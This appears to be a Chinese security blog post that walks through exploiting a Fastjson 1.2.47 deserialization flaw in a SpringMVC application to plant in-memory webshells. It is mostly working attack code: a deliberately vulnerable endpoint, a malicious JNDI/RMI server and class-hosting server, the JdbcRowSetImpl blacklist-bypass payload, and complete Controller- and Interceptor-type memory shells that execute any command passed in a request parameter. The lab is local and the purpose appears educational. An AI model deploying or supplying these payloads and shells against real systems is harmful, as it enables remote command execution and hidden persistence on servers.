> 原文链接: https://www.anquanke.com//post/id/248155 


# SpringMVC配合Fastjson的内存马利用与分析


                                阅读量   
                                **26434**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                    



[![](https://p5.ssl.qhimg.com/t012bebdbccadf411bf.jpg)](https://p5.ssl.qhimg.com/t012bebdbccadf411bf.jpg)



## SpringMVC

Spring MVC是一种基于Java的实现了Web MVC设计模式的请求驱动类型的轻量级Web框架，即使用了MVC架构模式的思想，将web层进行职责解耦，基于请求驱动指的就是使用请求-响应模型，框架的目的就是帮助我们简化开发，Spring Web MVC也是要简化我们日常Web开发的

总而言之，SpringMVC框架使用范围极广。笔者大二曾参与多个实际上线Java项目的开发，他们的框架都包含了SpringMVC

下面做一个基本的功能演示：

```
@Controller
public class TestController `{`
    @RequestMapping("/test")
    @ResponseBody
    public String test()`{`
        return "&lt;h1&gt;hello world&lt;/h1&gt;";
    `}`
`}`
```

以上代码实现了用户访问`localhost:8080/test`后返回html代码`&lt;h1&gt;hello world&lt;/h1&gt;`



## 搭建环境

笔者为了方便搭建环境，采用了SpringBoot，JDK为8u131，使用Fastjson创造反序列化利用点

```
&lt;dependencies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
            &lt;version&gt;1.2.47&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;
            &lt;scope&gt;test&lt;/scope&gt;
        &lt;/dependency&gt;
    &lt;/dependencies&gt;
```

创造一个反序列化利用点

```
// 使用fastjson 1.2.47模拟利用点
import com.alibaba.fastjson.JSON;

@Controller
public class TestController `{`
    @RequestMapping("/deserialize")
    @ResponseBody
    public String deserialize(@RequestParam String code) throws Exception`{`
        // 本地JDK版本过高，为了方便，直接设置系统变量以成功利用JNDI注入
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        JSON.parse(code);
        return "deserialize";
    `}`
`}`
```



## 漏洞利用

首先尝试弹出计算器，确保利用成功后再尝试内存马

攻击者启动`JNDI Server`

```
public class JNDIServer `{`
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException `{`
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("badClassName",
                "com.test.shell.badClassName","http://127.0.0.1:8000/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("Exploit", referenceWrapper);
    `}`
`}`
```

其中的`badClassName`代码如下，在静态代码块中执行计算器命令

```
package com.test.shell;

public class badClassName `{`
    static `{`
        try `{`
            Runtime.getRuntime().exec("calc");
        `}` catch (Exception e) `{`
            e.printStackTrace();
        `}`
    `}`
`}`
```

`Reference`的`factoryLocation`为class文件的http服务器，笔者使用Golang做了简单的路径映射

注意：不能直接映射到badClassName当前路径，而是classes路径

```
func main() `{`
    mux := http.NewServeMux()
    path := "YourPath\\Fastjson\\target\\classes"
    mux.Handle("/", http.StripPrefix("/", http.FileServer(http.Dir(path))))
    if err := http.ListenAndServe(":8000", mux); err != nil `{`
        fmt.Println("ok")
    `}`
`}`
```

图片是访问`/com/test/shell`后的效果

[![](https://p3.ssl.qhimg.com/t01bc679e1ae27759ea.png)](https://p3.ssl.qhimg.com/t01bc679e1ae27759ea.png)

使用Golang发送Fastjson的`JdbcRowSetImpl`类型的Payload

```
func main() `{`
    clint := &amp;http.Client`{``}`
    payload := "`{`\n" +
        "    \"a\":`{`\n" +
        "        \"@type\":\"java.lang.Class\",\n" +
        "        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n" +
        "    `}`,\n" +
        "    \"b\":`{`\n" +
        "        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +
        "        \"dataSourceName\":\"rmi://127.0.0.1:1099/Exploit\",\n" +
        "        \"autoCommit\":true\n" +
        "    `}`\n" +
        "`}`"
    // 防止出现意外问题，对Payload进行URL编码
    resp, err := clint.Get("http://127.0.0.1:8080/deserialize?code=" + url.QueryEscape(payload))
    if err != nil `{`
        fmt.Println(err)
    `}`
    fmt.Println(resp.StatusCode)
`}`
```

当我们发送后发现成功弹出计算器

[![](https://p0.ssl.qhimg.com/t01abd04e04c32ff3cf.png)](https://p0.ssl.qhimg.com/t01abd04e04c32ff3cf.png)

既然分析到此处，顺便来看一下1.2.47版本绕过和`JdbcRowSetImpl`的原理，使用a和b两个对象，为了将a设置到缓存`mapping`中在第二个对象加载时绕过哈希黑名单和关闭动态类型机制。`JdbcRowSetImpl`对象我们设置其`autoCommit`属性为`true`是因为在`setAutoCommit`方法中有如下代码

```
public void setAutoCommit(boolean var1) throws SQLException `{`
    if (this.conn != null) `{`
        this.conn.setAutoCommit(var1);
    `}` else `{`
        this.conn = this.connect();
        this.conn.setAutoCommit(var1);
    `}`
`}`
```

由于没有设置`this.conn`代码会进入`this.connect`，其中包含了 `lookup(this.getDataSourceName())`的代码。这里的`dataSourceName`正是传入的值，在这里被当作参数传入`lookup`函数，然后前往JNDI Server使用对应的协议寻找，由于JDNI绑定Reference，这里会加载到本地，实例化

```
private Connection connect() throws SQLException `{`
    if (this.conn != null) `{`
        return this.conn;
    `}` else if (this.getDataSourceName() != null) `{`
        try `{`
            InitialContext var1 = new InitialContext();
            DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
            ......
```



## 内存马

上文已经成功弹出计算器了，说明笔者创造的漏洞点生效，下面将介绍内存马

该内存马代码参考网上大佬的博客，做了一些修改，本文后续正是采用此方法（将在后文给出大佬博客链接）

```
package com.test.shell;

import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.handler.AbstractHandlerMethodMapping;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class InjectToController `{`
    public InjectToController() throws ClassNotFoundException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException, InvocationTargetException `{`
        // 关于获取Context的方式有多种
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.
                currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        Method method = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping").getDeclaredMethod("getMappingRegistry");
        method.setAccessible(true);
        // 通过反射获得该类的test方法
        Method method2 = InjectToController.class.getMethod("test");
        // 定义该controller的path
        PatternsRequestCondition url = new PatternsRequestCondition("/good");
        // 定义允许访问的HTTP方法
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        // 构造注册信息
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        // 创建用于处理请求的对象，避免无限循环使用另一个构造方法
        InjectToController injectToController = new InjectToController("aaa");
        // 将该controller注册到Spring容器
        mappingHandlerMapping.registerMapping(info, injectToController, method2);
    `}`

    // 第二个构造函数
    public InjectToController(String aaa) `{`
    `}`

    public void test() throws IOException `{`
        // 获取请求
        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
        // 获取请求的参数cmd并执行
        // 类似于PHP的eval($_GET["cmd"])
        Runtime.getRuntime().exec(request.getParameter("cmd"));
    `}`
`}`
```

注意网上给出的这部分代码在高版本SpringMVC中无效，并且找不到合适的替代。这部分代码的目的是防止注册重复path，这种问题其实不需要这种复杂处理，对上文中`/good`部分的path替换为`/Go0D`等组合即可，因为正常的业务代码不可能定义这类特殊的path

```
Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry").getDeclaredField("urlLookup");
```

这是Controller形的内存马，同时存在Interceptor型的内存马。Interceptor名为拦截器，类似Filter，常用于处理权限问题，有兴趣的师傅可以尝试

```
public class TestInterceptor extends HandlerInterceptorAdapter `{`
    public TestInterceptor() throws NoSuchFieldException, IllegalAccessException, InstantiationException `{`
        // 获取context
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        // 从context中获取AbstractHandlerMapping的实例对象
        org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping");
        // 反射获取adaptedInterceptors属性
        java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        field.setAccessible(true);
        java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;) field.get(abstractHandlerMapping);
        // 避免重复添加
        for (int i = adaptedInterceptors.size() - 1; i &gt; 0; i--) `{`
            if (adaptedInterceptors.get(i) instanceof TestInterceptor) `{`
                System.out.println("已经添加过TestInterceptor实例了");
                return;
            `}`
        `}`
        TestInterceptor aaa = new TestInterceptor("aaa");  // 避免进入实例创建的死循环
        adaptedInterceptors.add(aaa);  //  添加全局interceptor
    `}`

    private TestInterceptor(String aaa) `{`
    `}`

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception `{`
        String code = request.getParameter("code");
        // 不干扰正常业务逻辑
        if (code != null) `{`
            java.lang.Runtime.getRuntime().exec(code);
            return true;
        `}` else `{`
            return true;
        `}`
    `}`
`}`
```

注意其中的这部分代码在高版本SpringMVC中会遇到错误，导致无法注册Interceptor。由于时间关系，笔者并未尝试寻找替代类，有兴趣的师傅可以寻找合适的高版本利用方式

```
context.getBean("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping");
```

提供landgrey师傅文章中获取context的几种方式，测试高版本SpringMVC可用的如下

```
WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());

WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());

// 本文的方式
WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
```

说了这么多，还没进行内存马的利用，改下JNDI Server

```
public class JNDIServer `{`
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException `{`
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("InjectToController",
                "com.test.shell.InjectToController", "http://127.0.0.1:8000/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("Exploit", referenceWrapper);
    `}`
`}`
```

访问`localhost:8080/good?cmd=calc`，成功生成内存马

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01db950afe244f79de.png)



## 写在后面

关于本文有几处思考：

1.目前的内存马是无回显的，可以修改代码实现回显

2.笔者模拟的利用点是Fastjson反序列化，是否有其他方式（思路：SPEL型RCE，SSTI…）

3.既然Spring可以，那Struts2/Tomcat，甚至国产框架JFinal等框架是否也可以有类似的思路



## 参考链接

[https://landgrey.me/blog/12/](https://landgrey.me/blog/12/)

[https://landgrey.me/blog/19/](https://landgrey.me/blog/19/)

[https://xz.aliyun.com/t/9344](https://xz.aliyun.com/t/9344)

[https://www.cnblogs.com/bitterz/p/14859766.html](https://www.cnblogs.com/bitterz/p/14859766.html)

[https://www.cnblogs.com/bitterz/p/14820898.html](https://www.cnblogs.com/bitterz/p/14820898.html)
